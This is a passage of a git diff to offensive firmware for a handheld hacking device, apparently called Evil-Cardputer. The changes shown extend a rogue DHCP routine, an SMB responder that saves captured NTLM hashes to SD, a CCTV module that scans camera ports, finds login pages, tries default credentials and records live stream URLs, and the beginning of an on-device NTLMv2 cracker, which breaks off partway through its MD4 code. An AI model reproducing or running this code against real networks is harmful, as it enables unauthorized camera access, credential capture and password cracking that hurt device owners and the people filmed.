         updateDisplay("ACK sent.");
       }
+
     }
   }
   updateDisplay("Rogue DHCP stopped.");
@@ -16002,7 +17079,7 @@ void sdToUsb() {
   spiInterface.begin(sdClockPin, sdDataInPin, sdDataOutPin, sdChipSelectPin);
 
   // Attente stricte du montage du média SD
-  while (!SD.begin(sdChipSelectPin, spiInterface)) {
+  while (!SD.begin(sdChipSelectPin, spiInterface, 40000000UL)) {
     delay(1000);
   }
 
@@ -17440,7 +18517,7 @@ void extractAndPrintHash(uint8_t* pkt, uint32_t smbLength, uint8_t* ntlm) {
   Serial.println(F("------------------------------------"));
 
   // 8. Save sur SD
-  File file = SD.open("/evil/ntlm_hashes.txt", FILE_APPEND);
+  File file = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_APPEND);
   if (file) {
     file.println(finalHash);
     file.close();
@@ -17674,26 +18751,6 @@ void sendSMB2NegotiateFromSMB1() {
   smbState.client.write(resp, total);
   Serial.println(F("→ Negotiate Response SMB‑v2 send (upgrade successfull)"));
 }
-
-#include <cmath>
-#define PI 3.14159265f
-
-// --- CONFIGURATION RADAR ---
-const int RADAR_R        = 50;   // rayon du radar (px)
-const int RADAR_MARGIN   = 10;   // marge autour
-const int MAX_DETECTIONS = 10;   // nombre max de points simultanés
-const int DET_TTL        = 60 ;   // durée de vie initiale des points (frames)
-
-struct DetPoint {
-  int x, y;
-  int ttl;   // durée de vie restante en frames
-};
-DetPoint detections[MAX_DETECTIONS];
-int detCount = 0;
-
-// Variables globales du radar
-float currentAngle = 0.0f;
-int currentCx = 0, currentCy = 0, currentR = RADAR_R;
 
 void addDetectionPoint() {
     static int callCount = 0;
@@ -19500,7 +20557,9 @@ void httpBeginAuto(HTTPClient& http, WiFiClient& cli, WiFiClientSecure& tls, con
 /**** Ports à balayer (liste étendue) ****/
 const uint16_t cameraPorts[] PROGMEM = {
   // Web
-  80, 443, 8080, 8443, 8000,
+  80, 81, 82, 83, 84, 85, 86, 87, 88, 89,
+  
+  443, 8080, 8443, 8000,
 
   8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010,
   8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
@@ -19534,14 +20593,78 @@ const char * const cameraPaths[] PROGMEM = {
   "/axis-cgi/mjpg/video.cgi", "/axis-cgi/com/ptz.cgi", "/axis-cgi/param.cgi",
   "/cgi-bin/snapshot.cgi", "/cgi-bin/hi3510/snap.cgi", "/videostream.cgi", "/mjpg/video.mjpg"
 };
+
+const char * const mjpegPaths[] PROGMEM = {
+  // Axis
+  "/axis-cgi/mjpg/video.cgi",
+
+  // Foscam / D-Link / EasyN
+  "/mjpeg.cgi",
+  "/video/mjpg.cgi",
+  "/videostream.cgi",
+
+  // Edimax / Intellinet / TP-Link / Trendnet / Vivotek
+  "/mjpg/video.mjpg",
+  "/jpg/image.jpg",
+  "/snapshot.cgi",
+  "/image.jpg",
+  "/cgi-bin/video.jpg",
+  "/cgi-bin/viewer/video.jpg",
+
+  // Panasonic
+  "/SnapshotJPEG",
+  "/cgi-bin/nphMotionJpeg",
+
+  // Mobotix
+  "/faststream.jpg",
+  "/control/faststream.jpg",
+
+  // Génériques
+  "/stream.jpg",
+  "/video.jpg",
+  "/liveimg.cgi",
+  "/now.jpg",
+  "/image",
+  "/oneshotimage.jpg"
+};
+const size_t NB_MJPEG_PATHS = sizeof(mjpegPaths) / sizeof(mjpegPaths[0]);
+
 const size_t NB_CAMERA_PATHS = sizeof(cameraPaths) / sizeof(cameraPaths[0]);
 
 /**** Content-Types indicateurs caméra ****/
 const char * const camContentTypes[] PROGMEM = {
-  "image/jpeg", "image/mjpeg", "video/mpeg", "video/mp4", "video/h264",
-  "application/x-mpegURL", "video/MP2T", "application/octet-stream",
-  "text/html", "application/json"
+  // Snapshots / MJPEG
+  "image/jpeg",
+  "image/jpg",                  // parfois utilisé
+  "image/pjpeg",                // progressive JPEG
+  "image/png",                  // snapshots parfois PNG
+  "image/gif",                  // rarement (old firmwares)
+  "multipart/x-mixed-replace",  // MJPEG stream
+
+  // Vidéos
+  "video/mpeg",
+  "video/mp4",
+  "video/h264",
+  "video/h265",                 // caméras récentes
+  "video/hevc",
+  "video/3gpp",
+  "video/webm",
+  "video/ogg",
+  "application/mp4",            // variation
+  "application/sdp",            // RTSP proxifié en HTTP
+  "application/vnd.apple.mpegurl", // HLS (m3u8)
+  "application/x-mpegURL",      // HLS alt spelling
+  "application/octet-stream",   // souvent MJPEG ou TS raw
+  "video/MP2T",                 // MPEG-TS
+  "application/x-rtsp",         // certains proxys
+
+  // Divers (API/JSON/XML qui renvoient parfois des URLs stream)
+  "text/html",
+  "application/json",
+  "application/xml",
+  "text/xml"
 };
+
 const size_t NB_CT = sizeof(camContentTypes)/sizeof(camContentTypes[0]);
 
 
@@ -19675,12 +20798,13 @@ void uiRefresh(int pct = -1, const String& label = "") {
   uiDrawContent();
   M5.Display.display();
 }
-
+std::vector<String> loginCandidates;
 void uiBeginHost(const IPAddress& ip) {
   _ui.ip = ip;
   _ui.phase = "Starting…";
   _ui.lines.clear();
   _ui.report = "";
+  loginCandidates.clear(); // NEW
 }
 
 void uiPhase(const String& phase) {
@@ -19888,7 +21012,7 @@ void local_scan_CCTV() {
 }
 
 /* Test rapide d’un port */
-bool isPortOpen(IPAddress ip, uint16_t port, uint32_t tout = 1500) {
+bool isPortOpen(IPAddress ip, uint16_t port, uint32_t tout = 1000) {
   WiFiClient client;
   bool ok = connectWithTimeout(client, ip, port, tout);
   if (ok) client.stop();
@@ -19897,41 +21021,47 @@ bool isPortOpen(IPAddress ip, uint16_t port, uint32_t tout = 1500) {
 
 std::vector<uint16_t> scanCameraPorts(IPAddress ip) {
   uiPhase("Port scan");
+  Serial.printf("-- Starting Port Scan --\n");
   std::vector<uint16_t> open;
   String openList = "";
 
   for (size_t i = 0; i < NB_CAMERA_PORTS; ++i) {
     uint16_t p = pgm_read_word(&cameraPorts[i]);
-    if (isPortOpen(ip, p)) {
+
+    Serial.printf("[TEST] %s:%u\n", ip.toString().c_str(), p);
+    if (isPortOpen(ip, p, 750)) {
       open.push_back(p);
       if (openList.length()) openList += ",";
       openList += String(p);
-      Serial.printf("[OPEN] %s:%u\n", ip.toString().c_str(), p);
+
+      Serial.printf("-[OPEN] %s:%u\n", ip.toString().c_str(), p);
       logScanResult(ip.toString() + ":" + String(p));
       uiAppend("Open port: " + String(p), false);
     }
+
     M5Cardputer.update();
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
     delay(6);
   }
 
   if (open.empty()) {
-    uiAppend("Open ports: none");
+      uiAppend("Open ports: none");
+      Serial.println("Open ports: none");
   } else {
-    uiAppend("Ports: " + openList);
+      uiAppend("Ports: " + openList);
+      Serial.println("[PORT] Ports: " + openList);
   }
   return open;
 }
+
 static const char* const LIVE_LIST_PATH = "/evil/CCTV/CCTV_live.txt";
 
-void appendMjpegToLiveList(const IPAddress& ip, uint16_t port) {
+void appendMjpegToLiveList(const IPAddress& ip, uint16_t port, const char* path) {
   ensureCCTVDir();
-  String url  = "http://" + ip.toString() + ":" + String(port) + "/mjpg/video.mjpg";
-  // dédup: on déduplique sur l’URL
-  if (fileContainsToken(LIVE_LIST_PATH, url)){
-    logScanResult("[SKIP] " + ip.toString() + ":" + String(port) + " Already Saved !");
-    return;
-  }
+  String url  = "http://" + ip.toString() + ":" + String(port) + path;
+
+  // éviter doublons
+  if (fileContainsToken(LIVE_LIST_PATH, url)) return;
 
   File f = SD.open(LIVE_LIST_PATH, FILE_APPEND);
   if (!f) f = SD.open(LIVE_LIST_PATH, FILE_WRITE);
@@ -19939,16 +21069,17 @@ void appendMjpegToLiveList(const IPAddress& ip, uint16_t port) {
     String line = ip.toString() + " | " + url;
     f.println(line);
     f.close();
-    // facultatif: feedback discret à l’écran / log
     uiAppend("[+] CCTV_live: " + line, false);
     Serial.printf("[CCTV_LIVE] %s\n", line.c_str());
   } else {
     uiAppend("[x] Cannot write CCTV_live.txt", false);
   }
 }
+
 int httpOk = 0;
 void findLoginPages(IPAddress ip, const std::vector<uint16_t>& ports) {
   uiPhase("Finding login pages");
+    Serial.printf("-- Starting Login Pages Finder --\n");
   int found = 0;
 
   for (uint16_t p : ports) {
@@ -19959,11 +21090,9 @@ void findLoginPages(IPAddress ip, const std::vector<uint16_t>& ports) {
       HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
       String fullUrl = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + path;
 
-      // → AFFICHAGE EN SERIAL DE L'URL TESTÉE
       Serial.printf("[TEST] %s\n", fullUrl.c_str());
-
       httpBeginAuto(http, cli, tls, fullUrl);
-      http.setTimeout(5000);   // <-- Timeout explicite de 5 secondes
+      http.setTimeout(2000);
 
       int code = http.sendRequest("HEAD");
       http.end();
@@ -19971,13 +21100,13 @@ void findLoginPages(IPAddress ip, const std::vector<uint16_t>& ports) {
       if (code == 200) {
         Serial.printf("[LOGIN] %s (HTTP %d)\n", fullUrl.c_str(), code);
         logScanResult("[LOGIN] " + fullUrl);
-        if (!isHttpsPort(p) && strcmp(path, "/mjpg/video.mjpg") == 0) {
-          appendMjpegToLiveList(ip, p);
-          logScanResult("[STREAM] " + fullUrl + " Saved !");
-          httpOk++;
-        }
         uiAppend(fullUrl + " (HTTP:" + code + ")", true);
         ++found;
+
+        String pth(path);
+        bool dup = false;
+        for (auto &s : loginCandidates) { if (s == pth) { dup = true; break; } }
+        if (!dup) loginCandidates.push_back(pth);
       }
 
       M5Cardputer.update();
@@ -19988,9 +21117,9 @@ void findLoginPages(IPAddress ip, const std::vector<uint16_t>& ports) {
       }
     }
   }
-
   uiAppend("Login pages: " + String(found));
 }
+
 
 
 
@@ -20029,6 +21158,7 @@ struct Credential {
 
 void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
   uiPhase("Default passwords");
+    Serial.printf("-- Starting Default Password check --\n");
 
   if (!SD.exists(CREDS_FILE)) {
     Serial.println("[×] credentials.txt missing.");
@@ -20037,20 +21167,24 @@ void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
   }
 
   File f = SD.open(CREDS_FILE, FILE_READ);
-  if (!f) {
-    uiAppend("[x] Cannot open credentials.txt");
-    return;
+  if (!f) { uiAppend("[x] Cannot open credentials.txt"); return; }
+
+  // --- NEW: fallback si rien n’a été détecté avant
+  static const char* DEFAULT_ENDPOINTS[] = { "/", "/login", "/admin", "/cgi-bin/login", "/index.html" };
+  std::vector<String> fallbackEP;
+  if (loginCandidates.empty()) {
+    for (size_t i = 0; i < sizeof(DEFAULT_ENDPOINTS)/sizeof(DEFAULT_ENDPOINTS[0]); ++i) {
+      fallbackEP.emplace_back(DEFAULT_ENDPOINTS[i]);
+    }
   }
+  const std::vector<String>& paths = loginCandidates.empty() ? fallbackEP : loginCandidates;
+  const size_t N_ENDPOINTS = paths.size();
 
-  static const char* endpoints[] = { "/", "/login", "/admin", "/cgi-bin/login", "/index.html" };
-  const size_t N_ENDPOINTS = sizeof(endpoints) / sizeof(endpoints[0]);
-
-  // tableau de cache : needsAuth[portIndex][pathIndex]
-  bool skipPath[16][N_ENDPOINTS]; // max 16 ports
-  memset(skipPath, 0, sizeof(skipPath));
+  // --- NEW: tableau de skip dynamique [ports.size()][paths.size()]
+  std::vector<std::vector<bool>> skipPath(ports.size(), std::vector<bool>(N_ENDPOINTS, false));
 
   auto portIndex = [&](uint16_t port) -> int {
-    for (size_t i = 0; i < ports.size(); ++i) if (ports[i] == port) return i;
+    for (size_t i = 0; i < ports.size(); ++i) if (ports[i] == port) return (int)i;
     return -1;
   };
 
@@ -20061,10 +21195,10 @@ void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
   // --- Phase 1 : préflight des chemins (un seul passage)
   for (uint16_t port : ports) {
     int pIdx = portIndex(port);
-    if (pIdx < 0 || pIdx >= 16 || !isHttpLikePort(port)) continue;
+    if (pIdx < 0 || !isHttpLikePort(port)) continue;
 
     for (size_t i = 0; i < N_ENDPOINTS; ++i) {
-      String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + endpoints[i];
+      String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + paths[i];
 
       HTTPClient http0; WiFiClient cli0; WiFiClientSecure tls0;
       const char* hdrKeys[] = {"WWW-Authenticate"};
@@ -20106,12 +21240,12 @@ void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
 
     for (uint16_t port : ports) {
       int pIdx = portIndex(port);
-      if (pIdx < 0 || pIdx >= 16 || !isHttpLikePort(port)) continue;
+      if (pIdx < 0 || !isHttpLikePort(port)) continue;
 
       for (size_t i = 0; i < N_ENDPOINTS; ++i) {
         if (skipPath[pIdx][i]) continue;
 
-        String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + endpoints[i];
+        String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + paths[i];
         Serial.printf("[TEST] Trying %s with %s:%s\n", url.c_str(), c.user, c.pass);
 
         HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
@@ -20146,6 +21280,7 @@ void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
     uiAppend("[x] No password found...");
   }
 }
+
 
 
 
@@ -20302,6 +21437,7 @@ bool fingerprintGeneric(IPAddress ip, uint16_t p) {
 /* Fingerprint principal (appelle par marque) */
 void fingerprintCamera(IPAddress ip, const std::vector<uint16_t>& ports, const String& brand) {
   uiPhase("Fingerprint & CVEs");
+  Serial.printf("-- Fingerprint & CVEs --\n");
   if (brand.length()) uiAppend("Brand: " + brand);
   int cves = countCVEsForBrand(brand);
   if (cves > 0) uiAppend("Known CVEs: " + String(cves), false);
@@ -20332,7 +21468,7 @@ bool readLineWithTimeout(WiFiClient& c, String& line, uint32_t timeout_ms = 1500
   return true;
 }
 
-String readBodyWithTimeout(WiFiClient& c, size_t max_bytes = 2048, uint32_t timeout_ms = 800) {
+String readBodyWithTimeout(WiFiClient& c, size_t max_bytes = 2048, uint32_t timeout_ms = 300) {
   String out;
   uint32_t t0 = millis();
   while ((millis() - t0) < timeout_ms && out.length() < (int)max_bytes) {
@@ -20382,7 +21518,7 @@ bool rtspDescribe(IPAddress ip, uint16_t port, const char* path, int& codeOut, b
   client.printf(
     "DESCRIBE %s RTSP/1.0\r\n"
     "CSeq: 2\r\n"
-    "User-Agent: Rvil-Cardputer\r\n"
+    "User-Agent: Evil-Cardputer\r\n"
     "Accept: application/sdp\r\n"
     "\r\n", url.c_str()
   );
@@ -20435,6 +21571,7 @@ String normalizeRtspBrandFromServer(const String& srvRaw) {
 
 bool isCamera(IPAddress ip, const std::vector<uint16_t>& ports, String& brandOut) {
   uiPhase("Detecting camera");
+    Serial.printf("-- Starting Camera Detection --\n");
 
   // Liste des serveurs RTSP connus
   const char* rtspServerNames[] = {
@@ -20529,7 +21666,7 @@ bool isCamera(IPAddress ip, const std::vector<uint16_t>& ports, String& brandOut
                 String norm = normalizeRtspBrandFromServer(srv);
                 brandOut = norm;                       // <<—— donne “Hipcam”, “TVT”, “Ubiquiti”, etc.
                 uiAppend("Type: " + srv);             // affichage cohérent
-                Serial.printf("[BRAND] normalized RTSP brand → %s\n", norm.c_str());
+                Serial.printf("[BRAND] RTSP brand → %s\n", norm.c_str());
                 logScanResult("[BRAND] " + norm);
                 rtspCli.stop();
                 return true;
@@ -20571,11 +21708,26 @@ bool isCamera(IPAddress ip, const std::vector<uint16_t>& ports, String& brandOut
 }
 
 
-/* ports "web-like" pour les HEAD HTTP rapides */
+// Fonction pour identifier si le port est susceptible de servir un site web
 bool isHttpLikePort(uint16_t p) {
-  if (isHttpsPort(p) || p == 80) return true;
-  if (p >= 8000 && p <= 8099) return true;
-  return false;
+  // ports explicitement NON-HTTP
+  switch (p) {
+    // RTSP
+    case 554: case 8554: case 10554: case 1554: case 2554:
+    case 3554: case 4554: case 5554: case 6554: case 7554: case 9554:
+      return false;
+
+    // RTMP
+    case 1935: case 1936: case 1937: case 1938: case 1939:
+      return false;
+
+    // ONVIF discovery (UDP) + DVR propriétaires
+    case 3702: case 37777:
+      return false;
+  }
+
+  // tous les autres (web/http-like) → on garde
+  return true;
 }
 
 /* ---------- RTSP helpers: path aléatoire pour anti faux-positifs ---------- */
@@ -20616,6 +21768,7 @@ void uiText(int x, int y, const char* s, uint32_t fg = TFT_WHITE, uint32_t bg = 
 
 void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
   uiPhase("Checking streams");
+  Serial.printf("-- Starting Check Streams --\n");
 
   // Chemins RTSP plausibles (réduits pour limiter le bruit)
   static const char* rtspPaths[] = {
@@ -20630,9 +21783,45 @@ void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
 
   // Chemins HTTP indicatifs (mjpeg/snapshot/etc.)
   static const char* httpStreamPaths[] = {
-    "/video","/stream","/mjpg/video.mjpg","/cgi-bin/mjpg/video.cgi","/axis-cgi/mjpg/video.cgi",
-    "/cgi-bin/viewer/video.jpg","/snapshot.jpg","/img/snapshot.cgi","/onvif/device_service","/onvif/streaming"
+    // Axis
+    "/axis-cgi/mjpg/video.cgi",
+  
+    // Foscam / D-Link / EasyN
+    "/mjpeg.cgi",
+    "/video/mjpg.cgi",
+    "/videostream.cgi",
+  
+    // Edimax / Intellinet / TP-Link / Trendnet / Vivotek
+    "/mjpg/video.mjpg",
+    "/jpg/image.jpg",
+    "/snapshot.cgi",
+    "/image.jpg",
+    "/cgi-bin/video.jpg",
+    "/cgi-bin/viewer/video.jpg",
+  
+    // Panasonic
+    "/SnapshotJPEG",
+    "/cgi-bin/nphMotionJpeg",
+  
+    // Mobotix
+    "/faststream.jpg",
+    "/control/faststream.jpg",
+  
+    // Génériques
+    "/video",
+    "/stream",
+    "/stream.jpg",
+    "/video.jpg",
+    "/liveimg.cgi",
+    "/now.jpg",
+    "/image",
+    "/oneshotimage.jpg",
+  
+    // ONVIF (services, non MJPEG mais utile)
+    "/onvif/device_service",
+    "/onvif/streaming"
   };
+
 
   int rtmpOk = 0;
   std::vector<String> rtspFound;      // pour sauvegarde SD
@@ -20646,21 +21835,23 @@ void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
 
     String publicHdr;
     if (rtspServicePresent(ip, p, &publicHdr)) {
+      
       // Serial existant
-      Serial.printf("[RTSP] service present at %s:%u  %s\n",
-                    ip.toString().c_str(), p, publicHdr.length() ? publicHdr.c_str() : "");
+      Serial.printf("[RTSP] service present at %s:%u  %s\n", ip.toString().c_str(), p, publicHdr.length() ? publicHdr.c_str() : "");
       logScanResult("[RTSP] service " + ip.toString() + ":" + String(p));
+      
       // Écran (même style)
       uiAppend(String("[RTSP] service: ") + ip.toString() + ":" + String(p));
       uiAppend(publicHdr.length() ? (publicHdr) : "");
       uiAppend(" ");
+      
       // Anti faux-positifs : tester un chemin aléatoire incohérent
       String garbage = makeRandomInvalidRtspPath();
       int garbageCode = -1; bool garbageSdp = false;
       if (rtspDescribe(ip, p, garbage.c_str(), garbageCode, garbageSdp) && garbageCode == 200 && garbageSdp) {
+        
         // Random path renvoie 200 (SDP) → faux positif probable
-        Serial.printf("[?] RTSP %s:%u%s -> 200 (SDP) on random path → check root / false positive likely\n",
-                      ip.toString().c_str(), p, garbage.c_str());
+        Serial.printf("[?] RTSP %s:%u%s -> 200 (SDP) on random path → check root / false positive likely\n", ip.toString().c_str(), p, garbage.c_str());
         uiAppend("rtsp://" + String(ip.toString() + ":" + String(p) + garbage + " (200)"));
         String genericRtsp = "rtsp://" + ip.toString() + ":" + String(p) + "/";
         bool already = false;
@@ -20669,6 +21860,7 @@ void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
           rtspFound.push_back(genericRtsp);
           logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + "/ 200/SDP");
           uiAppend("rtsp://" + ip.toString() + ":" + String(p) + "/ -> 200 !");
+          rtspFound.push_back("rtsp://" + ip.toString() + ":" + String(p) + "/");
         }
         if (g_scanFromSD) {
           Serial.println("[RTSP] SD mode → auto-skip known paths (no popup).");
@@ -20690,6 +21882,7 @@ void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
       for (const char* path : rtspPaths) {
         int code = -1; bool sdp = false;
         if (!rtspDescribe(ip, p, path, code, sdp)) continue;
+        Serial.printf("[TEST] rtsp://%s:%u%s\n",ip.toString().c_str(), p, path);
 
         if (code == 200 && sdp) {
           // Serial + log
@@ -20718,47 +21911,108 @@ AFTER_RTSP_PORT_SCAN:
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
   }
 
-  // 2) HTTP/HTTPS : HEAD rapides
   for (uint16_t p : ports) {
-    if (!(isHttpsPort(p) || p == 80 || (p >= 8000 && p <= 8099))) continue;
     for (const char* path : httpStreamPaths) {
       HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+  
       String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + path;
       httpBeginAuto(http, cli, tls, url);
+  
+      // 👉 IMPORTANT: collecter les headers que tu veux pouvoir lire ensuite
+      static const char* wantedHdrs[] = {
+        "Content-Type", "Content-Length", "Transfer-Encoding",
+        "WWW-Authenticate", "Server", "Cache-Control", "Pragma", "Expires", "Connection"
+      };
+      http.collectHeaders(wantedHdrs, sizeof(wantedHdrs)/sizeof(wantedHdrs[0]));
+  
+      // Optionnel: améliorer la négo côté firmware Axis
+      http.addHeader("Accept", "multipart/x-mixed-replace,image/jpeg,*/*");
+  
       int code = http.sendRequest("GET");
+      Serial.printf("[TEST] %s (HTTP %d)\n", url.c_str(), code);
+  
       if (code == 200) {
-        String ct = http.header("Content-Type"); String lct = ct; lct.toLowerCase();
+        String ct = http.header("Content-Type");
+        if (ct.length() == 0) {
+          // --\n-- Fallback: lire l’entête brut depuis le flux TCP
+          WiFiClient* s = http.getStreamPtr();
+          s->setTimeout(1000);
+          String raw;
+          Serial.println(F("===== RAW HTTP HEADERS ====="));
+          while (s->connected()) {
+            String line = s->readStringUntil('\n');
+            if (line == "\r" || line.length() == 0) break; // fin des headers
+            raw += line; raw += '\n';
+            Serial.print(line);
+          }
+          Serial.println(F("===== END HEADERS ====="));
+          // extraire Content-Type à la main (très simple, case-insensitive)
+          int pos = raw.indexOf("Content-Type:");
+          if (pos < 0) pos = raw.indexOf("content-type:");
+          if (pos >= 0) {
+            int eol = raw.indexOf('\n', pos);
+            ct = raw.substring(pos + 13, eol);
+            ct.trim();
+          }
+        }
+  
+        String lct = ct; lct.toLowerCase();
+  
         bool looksVideo = false;
-        for (size_t i=0; i<NB_CT; i++) {
+        for (size_t i = 0; i < NB_CT; i++) {
           const char* sig = reinterpret_cast<const char*>(pgm_read_ptr(&camContentTypes[i]));
-          if (lct.indexOf(sig) >= 0) { looksVideo = true; break; }
+          if (lct.indexOf(sig) >= 0) {
+            Serial.print(F("[MATCH] signature: ")); Serial.println(sig);
+            looksVideo = true;
+            break;
+          } else {
+            Serial.print(F("[NO MATCH] ")); Serial.println(sig);
+          }
         }
-        // === AUTO-APPEND DANS CCTV_live.txt SI /mjpg/video.mjpg SUR HTTP ===
-        if (!isHttpsPort(p) && strcmp(path, "/mjpg/video.mjpg") == 0) {
-          appendMjpegToLiveList(ip, p);
-          logScanResult("[STREAM] " + url + " Saved !");
-          httpOk++;
+  
+        // Plan B: si Content-Type absent/incorrect, détecter la boundary dans le corps
+        if (!looksVideo) {
+          WiFiClient* s = http.getStreamPtr();
+          unsigned long t0 = millis();
+          String firstKB;
+          while (s->available() == 0 && (millis() - t0) < 1000) delay(10);
+          while (s->available() && firstKB.length() < 2048) {
+            firstKB += char(s->read());
+          }
+          if (firstKB.startsWith("--") && firstKB.indexOf("Content-Type:") > 0) {
+            looksVideo = true;
+            if (ct.length() == 0) ct = F("multipart/x-mixed-replace (inferred)");
+          }
         }
+  
+        // --- LOG + comptage
+        Serial.print(F("Content-Type: ")); Serial.println(ct);
+        Serial.print(F("Video signature detected: "));
+        Serial.println(looksVideo ? F("YES") : F("NO"));
+  
         if (looksVideo) {
+          appendMjpegToLiveList(ip, p, path);
           Serial.printf("[🎥] %s  (%s)\n", url.c_str(), ct.c_str());
           logScanResult("[STREAM] " + url + " (" + ct + ")");
           httpOk++;
         }
       } else if (code == 400) {
-          Serial.printf("[x] %s  (400 Bad Request)\n", url.c_str());
-          logScanResult("[400] " + url);
-          http.end();
-          M5.Display.fillRect(0, 0, M5.Display.height(), 10, TFT_BLACK);
-          uiText(2, 0, "400 Bad Request", TFT_RED);
-          delay(1000);
-          return; // on quitte la détection et revient au menu
+        Serial.printf("[x] %s  (400 Bad Request)\n", url.c_str());
+        logScanResult("[400] " + url);
+        http.end();
+        M5.Display.fillRect(0, 0, M5.Display.height(), 10, TFT_BLACK);
+        uiText(2, 0, "400 Bad Request", TFT_RED);
+        delay(1000);
+        return;
       }
+  
       http.end();
       M5Cardputer.update();
       if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
           M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
     }
   }
+
 
 
   // 3) RTMP : indicatif (ouvert/fermé)
@@ -20776,6 +22030,11 @@ AFTER_RTSP_PORT_SCAN:
   uiAppend("Streams: RTSP " + String(rtspFound.size()) +
            "  HTTP " + String(httpOk) +
            "  RTMP " + String(rtmpOk));
+           
+  Serial.printf("Streams: RTSP %u  HTTP %u  RTMP %u\n",
+          (unsigned)rtspFound.size(),
+          (unsigned)httpOk,
+          (unsigned)rtmpOk);
 
   // —— Sauvegarde dans le rapport (fichier SD via uiEndHostAndSave)
   if (!rtspFound.empty()) {
@@ -20824,9 +22083,11 @@ void showIpInfo(const String& publicIp) {
 
 void processCCTVHost(const IPAddress& ip) {
   uiBeginHost(ip);
+  Serial.printf("-------------------------------------------------\n[NEW] Testing %s\n---\n", ip.toString().c_str());
 
   // Geo (only for public IPs)
   uiPhase("OSINT / GeoIP");
+  Serial.printf("-- OSINT / GeoIP --\n");
   showIpInfo(ip.toString());
 
   // 1) Ports
@@ -22237,3 +23498,696 @@ void scanCCTVCameras() {
     else if (sel == 4) scanCCTV_SpyDectection();backDebounce();
   }
 } 
+
+
+
+/*
+============================================================================================================================
+Crack NTLMv2
+============================================================================================================================
+*/
+
+
+
+#define ROL(x,n) ( (uint32_t)((uint32_t)(x) << (n)) | (uint32_t)((uint32_t)(x) >> (32-(n))) )
+#define F(x,y,z) (((x)&(y)) | ((~x)&(z)))
+#define G(x,y,z) (((x)&(y)) | ((x)&(z)) | ((y)&(z)))
+#define H(x,y,z) ((x) ^ (y) ^ (z))
+
+void MD4_Encode(uint8_t *output, const uint32_t *input, size_t len) {
+  for (size_t i=0,j=0; j<len; i++, j+=4) {
+    output[j]   = (uint8_t)( input[i]        & 0xff);
+    output[j+1] = (uint8_t)((input[i] >> 8)  & 0xff);
+    output[j+2] = (uint8_t)((input[i] >> 16) & 0xff);
+    output[j+3] = (uint8_t)((input[i] >> 24) & 0xff);
+  }
+}
+
+void MD4_Transform(uint32_t state[4], const uint8_t block[64]) {
+  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], X[16];
+  for (int i=0,j=0; j<64; i++, j+=4)
+    X[i] = (uint32_t)block[j] | ((uint32_t)block[j+1]<<8) |
+           ((uint32_t)block[j+2]<<16) | ((uint32_t)block[j+3]<<24);
+
+  #define ROUND1(a,b,c,d,k,s) a = ROL(a + F(b,c,d) + X[k], s)
+  #define ROUND2(a,b,c,d,k,s) a = ROL(a + G(b,c,d) + X[k] + 0x5a827999, s)
+  #define ROUND3(a,b,c,d,k,s) a = ROL(a + H(b,c,d) + X[k] + 0x6ed9eba1, s)
+
+  ROUND1(a,b,c,d, 0, 3);  ROUND1(d,a,b,c, 1, 7);  ROUND1(c,d,a,b, 2,11);  ROUND1(b,c,d,a, 3,19);
+  ROUND1(a,b,c,d, 4, 3);  ROUND1(d,a,b,c, 5, 7);  ROUND1(c,d,a,b, 6,11);  ROUND1(b,c,d,a, 7,19);
+  ROUND1(a,b,c,d, 8, 3);  ROUND1(d,a,b,c, 9, 7);  ROUND1(c,d,a,b,10,11);  ROUND1(b,c,d,a,11,19);
+  ROUND1(a,b,c,d,12, 3);  ROUND1(d,a,b,c,13, 7);  ROUND1(c,d,a,b,14,11);  ROUND1(b,c,d,a,15,19);
+
+  ROUND2(a,b,c,d, 0, 3);  ROUND2(d,a,b,c, 4, 5);  ROUND2(c,d,a,b, 8, 9);  ROUND2(b,c,d,a,12,13);
+  ROUND2(a,b,c,d, 1, 3);  ROUND2(d,a,b,c, 5, 5);  ROUND2(c,d,a,b, 9, 9);  ROUND2(b,c,d,a,13,13);
+  ROUND2(a,b,c,d, 2, 3);  ROUND2(d,a,b,c, 6, 5);  ROUND2(c,d,a,b,10, 9);  ROUND2(b,c,d,a,14,13);
+  ROUND2(a,b,c,d, 3, 3);  ROUND2(d,a,b,c, 7, 5);  ROUND2(c,d,a,b,11, 9);  ROUND2(b,c,d,a,15,13);
+
+  ROUND3(a,b,c,d, 0, 3);  ROUND3(d,a,b,c, 8, 9);  ROUND3(c,d,a,b, 4,11);  ROUND3(b,c,d,a,12,15);
+  ROUND3(a,b,c,d, 2, 3);  ROUND3(d,a,b,c,10, 9);  ROUND3(c,d,a,b, 6,11);  ROUND3(b,c,d,a,14,15);
+  ROUND3(a,b,c,d, 1, 3);  ROUND3(d,a,b,c, 9, 9);  ROUND3(c,d,a,b, 5,11);  ROUND3(b,c,d,a,13,15);
